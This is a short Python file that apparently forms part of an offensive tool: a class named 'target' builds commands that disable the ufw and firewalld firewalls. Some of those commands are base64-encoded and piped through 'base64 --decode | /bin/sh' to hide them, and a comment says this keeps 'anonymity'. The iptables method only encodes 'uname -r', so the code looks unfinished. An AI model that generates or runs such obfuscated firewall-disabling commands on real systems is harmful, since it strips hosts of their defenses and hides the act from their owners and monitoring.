import base64

class target:
    def ufw():
        cmd = "ufw disable"
        return cmd
    
    def firewalld():
        cmd_1 = "systemctl stop firewalld"
        ## random choose which way to resolve to keep anonymity
        

        # encoding, then formatting and returning b64 encoded command
        return b64formatter(encoder(cmd_1))
    
    def iptables():
        cmd = "uname -r"
        return b64formatter(encoder(cmd))

        


def encoder(plaintext):
    sample_string = plaintext
    sample_string_bytes = sample_string.encode("ascii")
    
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    
    return base64_string

def b64formatter(encoded):
    cmd = f"echo {encoded} | base64 --decode | /bin/sh"
    return cmd